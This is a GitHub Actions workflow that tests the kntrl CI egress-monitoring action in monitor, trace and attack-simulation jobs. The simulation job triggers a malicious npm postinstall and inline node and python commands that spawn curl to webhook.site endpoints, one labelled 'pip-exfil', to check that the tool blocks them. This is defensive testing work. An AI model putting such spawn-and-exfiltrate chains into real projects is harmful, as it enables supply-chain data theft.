name: Test kntrl Action

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:

jobs:
  # ──────────────────────────────────────────────
  # Job 1: Monitor mode — log everything, block nothing
  # ──────────────────────────────────────────────
  monitor:
    name: "Monitor mode (npm + pip)"
    runs-on: ubuntu-latest
    steps:
      - uses: kondukto-io/kntrl-action@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
        with:
          mode: monitor

      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: "20"

      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
        with:
          python-version: "3.12"

      - name: npm install
        run: npm install

      - name: npm test
        run: npm test

      - name: pip install
        run: pip install -r requirements.txt

      - name: python test
        run: python app.py

      - uses: kondukto-io/kntrl-action/stop@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
        if: always()

  # ──────────────────────────────────────────────
  # Job 2: Trace mode — enforce default rules
  # ──────────────────────────────────────────────
  enforce:
    name: "Trace mode (npm + pip)"
    runs-on: ubuntu-latest
    steps:
      - uses: kondukto-io/kntrl-action@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
        with:
          mode: trace
          allowed_hosts: "api.github.com"

      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: "20"

      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
        with:
          python-version: "3.12"

      - name: npm install
        run: npm install

      - name: npm test
        run: npm test

      - name: pip install
        run: pip install -r requirements.txt

      - name: python test
        run: python app.py

      - uses: kondukto-io/kntrl-action/stop@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
        if: always()

  # ──────────────────────────────────────────────
  # Job 3: Attack simulation — blocked chain executions
  # ──────────────────────────────────────────────
  attack-sim:
    name: "Trace mode (attack simulation)"
    runs-on: ubuntu-latest
    steps:
      - uses: kondukto-io/kntrl-action@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
        with:
          mode: trace
          allowed_hosts: "api.github.com"

      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: "20"

      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
        with:
          python-version: "3.12"

      # Simulate malicious postinstall: npm → curl, npm → wget, npm → python, npm → bash, npm → sh
      - name: "Attack sim: malicious npm postinstall"
        run: cd attack-sim && npm install --ignore-scripts=false
        continue-on-error: true

      # Simulate npm → node → curl chain (inline)
      - name: "Attack sim: node child spawns curl"
        run: node -e "try { require('child_process').execSync('curl -s --max-time 3 https://webhook.site/test', {stdio:'inherit'}) } catch(e) { console.log('Blocked:', e.message.split('\n')[0]) }"
        continue-on-error: true

      # Simulate npm → node → python chain (inline)
      - name: "Attack sim: node child spawns python"
        run: node -e "try { require('child_process').execSync('python3 -c \"print(\\\"credential-steal-sim\\\")\"', {stdio:'inherit'}) } catch(e) { console.log('Blocked:', e.message.split('\n')[0]) }"
        continue-on-error: true

      # Simulate pip → curl chain
      - name: "Attack sim: pip setup.py spawns curl"
        run: python3 -c "import subprocess; subprocess.run(['curl', '-s', '--max-time', '3', 'https://webhook.site/pip-exfil'])"
        continue-on-error: true

      - uses: kondukto-io/kntrl-action/stop@e4737f9aa99ffdaed5041e4de9bc621d03d1686f # v2-ts
        if: always()
